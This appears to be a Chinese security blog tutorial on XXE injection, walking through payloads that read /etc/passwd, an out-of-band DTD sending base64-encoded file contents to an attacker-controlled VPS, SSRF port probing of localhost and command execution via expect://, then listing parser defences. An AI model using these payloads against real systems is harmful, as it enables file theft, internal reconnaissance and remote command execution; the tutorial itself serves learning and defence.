**目录**

[XXE](#t0 "XXE")

[XXE漏洞演示利用(任意文件读取)](#t1 "XXE漏洞演示利用(任意文件读取)")

[Blind OOB XXE](#t2 "Blind OOB XXE")

[目录浏览和任意文件读取](#t3 "目录浏览和任意文件读取")

[端口扫描](#t4 "端口扫描")

[远程代码执行](#t5 "远程代码执行")

[XXE漏洞的挖掘](#t6 "XXE漏洞的挖掘")

[XXE的防御](#t7 "XXE的防御")

* * *

在学习XXE漏洞之前，我们先了解下[XML](https://so.csdn.net/so/search?q=XML&spm=1001.2101.3001.7020)。传送门——> [XML和JSON数据格式](https://blog.csdn.net/qq_36119192/article/details/83047334 "XML和JSON数据格式")

那么什么是XXE漏洞呢？

XXE
---

**XXE(**XML External Entity Injection**)**也就是XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时，XML文件的解析依赖libxml 库，而 libxml2.9 以前的版本默认支持并开启了对外部实体的引用，服务端解析用户提交的XML文件时，未对XML文件引用的外部实体（含外部一般实体和外部参数实体）做合适的处理，并且实体的URL支持 file:// 和 ftp:// 等协议，导致可加载恶意外部文件 和 代码，造成**任意文件读取**、**命令执行**、**内网端口扫描**、**攻击内网网站**、**发起Dos攻击**等危害。

XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件

那么如何构建外部实体注入呢？

**方式一：直接通过DTD外部实体声明**

```
<?xml version="1.0"?>      
<!DOCTYPE a[      
    <!ENTITY b SYSTEM "file:///etc/passwd">      
]>      
<a>&b;</a>
```


**方式二：(一般实体)通过DTD外部实体声明引入外部DTD文档，再引入外部实体声明**

```
<?xml version="1.0"?>      
<!DOCTYPE a [      
       <!ENTITY b SYSTEM "http://mark4z5.com/evil.dtd">      
]>      
<a>&b;</a>       
#而http://mark4z5.com/evil.dtd内容为      
<!ENTITY b SYSTEM "file:///etc/passwd">
```


**方式三：(参数实体)通过DTD外部实体声明引入外部DTD文档，再引入外部实体声明**

```
<?xml version="1.0"?>      
<!DOCTYPE a [      
    <!ENTITY %b SYSTEM "http://mark4z5.com/evil.dtd">      
]>      
<a>%b;</a>       
#http://mark4z5.com/evil.dtd文件内容      
<!ENTITY b SYSTEM "file:///etc/passwd">
```


XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。

**支持的协议**

![](https://img-blog.csdnimg.cn/20200317160025754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

其中php支持的协议会更多一些，但需要一定的扩展支持

![](https://img-blog.csdnimg.cn/2020031716011170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

XXE漏洞演示利用(任意文件读取)
-----------------

以下是一个简单的XML代码POST请求示例，上述代码将交由服务器的XML处理器解析。代码被解释并有回显数据。

![](https://img-blog.csdnimg.cn/20200107113538872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这里我们引用外部DTD实体，并且将 email 的值修改为引用外部实体的值 &file;   因为，返回包会返回email的值，所以返回包会读取我们引用的 /etc/passwd 的值返回给我们，造成了任意文件读取。

![](https://img-blog.csdnimg.cn/2020010711382638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

利用详情：[XXE漏洞利用](https://blog.csdn.net/qq_36119192/article/details/103866581?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158443059119724848318016%2522%252C%2522scm%2522%253A%252220140713.130056874..%2522%257D&request_id=158443059119724848318016&biz_id=0&utm_source=distribute.pc_search_result.none-task "XXE漏洞利用")

**Blind XXE**
-------------

如上例所示，服务器将 /etc/passwd 文件的内容作为响应返回给我们的XXE。但是在大多数情况下，即使服务器可能存在XXE漏洞，服务器也不会向攻击者的浏览器返回任何响应。遇到这种情况，可以实现OOB(out-of-band)信息传递和通过构造dtd从错误信息获取数据**。**无论是OOB、还是基于错误的方式，都需要引入外部DTD文件。

*   **OOB(Out-Of-Band)：**我们可以使用 Blind XXE 漏洞来构建一条外带数据OOB(Out-Of-Band)通道来读取数据。
*   **错误获取数据**：通过构造dtd然后从错误中获取数据

### 通过OOB进行目录浏览和任意文件读取

注：Linux机器可以目录浏览和任意文件读取，Windows机器只能任意文件读取

Blind XXE是由于虽然目标服务器加载了XML数据，但是不回显读取的数据。那么，我们是否可以想其他的办法，将服务器读取的数据传送给我们的VPS呢？

于是，我们想到了如下：

**VPS的操作**

首先，在我们的VPS上搭建一个Http服务，然后创建一个xml.dtd文件，内容如下

```
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://VPS的地址:2121/%file;'>">      
%all;
```


 然后在VPS上用python在2121端口起另一个http服务

![](https://img-blog.csdnimg.cn/2020031821014113.png)

**POST提交的数据**

```
<?xml version="1.0"?>      
<!DOCTYPE message [      
    <!ENTITY % remote SYSTEM "http://VPS的http服务/xml.dtd">        
    <!ENTITY % file SYSTEM "file:///C:/Users/mi/Desktop/1.txt">      
    %remote;      
    %send;      
]>
```


![](https://img-blog.csdnimg.cn/2020031821050354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200318210320250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

但是如果读取的文件数据有空格的话，这样的读不出来的，所以我们可以用base64编码

```
<?xml version="1.0"?>      
<!DOCTYPE message [      
    <!ENTITY % remote SYSTEM "http://VPS的http服务/xml.dtd">        
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C:/Users/mi/Desktop/1.txt">      
    %remote;      
    %send;      
]>
```


![](https://img-blog.csdnimg.cn/20200318212512942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/2020031821245083.png)

然后对base64进行解码

![](https://img-blog.csdnimg.cn/20200318212614838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果目标是JAVA环境的话，建议采用FTP协议，相关文章：[利用Blind XXE Getshell](https://xie1997.blog.csdn.net/article/details/104933799 "利用Blind XXE Getshell")

### **端口扫描**

在第一个示例中，我们通过URI将请求指向了/etc/passwd文件，并最终成功的为我们返回了文件中的内容。除此之外，我们也可以使用 http URI 并强制服务器向我们指定的端点和端口发送GET请求，将 XXE 转换为SSRF（服务器端请求伪造）。

以下代码将尝试与端口通信，根据响应时间/长度，攻击者将可以判断该端口是否已被开启。

```
<?xml version="1.0"?>      
<!DOCTYPE GVI [      
    <!ENTITY xxe SYSTEM "http://127.0.0.1:80" >      
]>
```


如下，探测本地81端口是否开放，如果不开放，则响应时间比较久 

![](https://img-blog.csdnimg.cn/20200318213207806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

探测本地80端口，开放，响应时间很快速

![](https://img-blog.csdnimg.cn/20200318213311996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### **远程代码执行**

这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：

```
<?xml version="1.0"?>      
<!DOCTYPE GVI [ <!ELEMENT foo ANY >      
<!ENTITY xxe SYSTEM "expect://id" >]>      
<catalog>      
   <core id="test101">      
      <author>John, Doe</author>      
      <title>I love XML</title>      
      <category>Computers</category>      
      <price>9.99</price>      1
      <date>2018-10-01</date>      1
      <description>&xxe;</description>      1
   </core>      1
</catalog>
```


响应：

```
{"error": "no results for description uid=0(root) gid=0(root) groups=0(root)...
```


XXE漏洞的挖掘
--------

通过手工篡改网站中xml实体中的头部，加入相关的读取文件或者是链接，或者是命令执行等，如file:///$path/file.txt；http://url/file.txt；看看能否显示出来

XXE的防御
------

XML解析库在调用时严格禁止对外部实体的解析。

**方案一：使用开发语言提供的禁用外部实体的方法**

```
PHP：      
libxml_disable_entity_loader(true);       
JAVA:      
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();      
dbf.setExpandEntityReferences(false);       
Python：      
from lxml import etree      1
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```


**方案二：过滤用户提交的XML数据**  
关键词：<!DOCTYPE  和  <!ENTITY  或者  SYSTEM和PUBLIC。

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[XXE漏洞利用技巧：从XML到远程代码执行](https://www.csdn.net/link?target_url=https%3A%2F%2Fwww.freebuf.com%2Farticles%2Fweb%2F177979.html&id=84993356&token=7930a07187682a8868f3f434250e7b6d "XXE漏洞利用技巧：从XML到远程代码执行")

                  [xxe漏洞的学习与利用总结](https://www.cnblogs.com/r00tuser/p/7255939.html "xxe漏洞的学习与利用总结")  
相关文章：[XXE之利用本地DTD进行文件读取](https://www.freebuf.com/column/215000.html "XXE之利用本地DTD进行文件读取")

                  [Blind XXE详解与Google CTF一道题分析](https://www.freebuf.com/vuls/207639.html "Blind XXE详解与Google CTF一道题分析")

                  [从Blind XXE漏洞到读取Root文件的系统提权](https://www.freebuf.com/vuls/194489.html "从Blind XXE漏洞到读取Root文件的系统提权")